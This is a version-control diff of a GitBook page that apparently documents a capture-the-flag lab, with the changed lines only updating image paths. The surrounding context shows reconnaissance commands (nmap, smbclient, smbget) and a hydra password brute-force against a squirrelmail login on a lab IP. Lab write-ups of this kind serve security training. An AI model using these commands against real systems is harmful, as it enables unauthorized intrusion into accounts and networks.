@@ -12,7 +12,7 @@ nmap -A 10.10.13.172
 smbclient -L //10.10.13.172
 ```
 
-<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (13) (2).png" alt=""><figcaption></figcaption></figure>
 
 ```
 smbget -R smb://10.10.13.172/anonymous
@@ -47,7 +47,7 @@ hydra -l milesdyson -P passwords.txt 10.10.13.172 http-post-form "/squirrelmail/
 
 We can now login to squirrelmail that gobuster discovered.
 
-<figure><img src="../../.gitbook/assets/image (10) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (9) (3) (2).png" alt=""><figcaption></figcaption></figure>
 
